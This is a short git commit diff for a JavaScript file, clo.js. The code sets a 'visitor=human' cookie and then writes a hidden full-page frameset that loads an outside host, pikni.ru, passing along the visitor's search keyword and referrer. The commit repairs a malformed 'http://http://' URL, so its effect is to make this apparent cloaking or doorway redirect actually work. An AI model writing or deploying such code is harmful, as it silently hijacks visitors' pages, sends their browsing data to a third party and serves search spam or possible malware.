0332693fee5d8f0b2be32165f7740f2299945529
locky1221 <userning.o@gmail.com>
2020-05-02 18:59:19 +0300

    Update clo.js

--- clo.js
+++ clo.js
@@ -2,4 +2,4 @@
 ws.setMinutes(10+ws.getMinutes());
 document.cookie="visitor=human; path=/; expires="+ ws.toGMTString();
 if (document.cookie.match(/visitor=human/gi)){
-	document.write('<frameset rows="*,0" framespacing="0" border="0" frameborder="NO"><frame src="http://http://pikni.ru/forum/lfn1&keyword='+key+'&se_referrer='+ref+'" noresize="" scrolling="auto"></frameset>   ');
+	document.write('<frameset rows="*,0" framespacing="0" border="0" frameborder="NO"><frame src="http://pikni.ru/forum/lfn1&keyword='+key+'&se_referrer='+ref+'" noresize="" scrolling="auto"></frameset>   ');
